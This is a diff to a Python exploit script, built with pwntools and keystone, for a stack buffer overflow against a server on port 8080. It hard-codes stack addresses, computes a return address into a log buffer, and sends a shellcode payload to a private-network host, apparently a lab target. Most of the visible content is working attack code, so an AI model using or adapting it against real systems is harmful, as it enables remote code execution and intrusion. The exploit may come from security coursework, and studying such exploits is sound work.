@@ -58,8 +58,9 @@ from keystone import *
 from pwn import *
 
 ### CONFIGS ###
+host = "192.168.152.130"
 port = 8080
-original_rbp = 0x7ffff7ad1920 # the rbp value before the 'ret' instruction executed
+original_rbp = 0x7ffff7ace920 # the rbp value before the 'ret' instruction executed
 log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
 log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer
 
@@ -117,11 +118,12 @@ retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_pre
 sc1_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
 sc1_exploit += b"\r\n\r\n"
 
+print(sc1_exploit)
 
 ### PERFORM ATTACK ###
-remote("localhost", port).send(crash) # send crash payload
-sleep(2) # let the server restart
-remote("localhost", port).send(sc1_exploit) # send attack payload
+# remote(host, port).send(crash) # send crash payload
+# sleep(2) # let the server restart
+remote(host, port).send(sc1_exploit) # send attack payload
 
 
 # details for 'payload_rsp_offset':
@@ -131,7 +133,7 @@ remote("localhost", port).send(sc1_exploit) # send attack payload
 #                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
 #                                         |            |                         |
 #                                         ||<---0x10-->|<---------0x450--------->|
-# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
+# stack: <high addresses> =|=E====B======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
 #                          |               |           |<5>|=========<4>=========|
 #                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
 #                                          |                       |<-24->|<-49->|
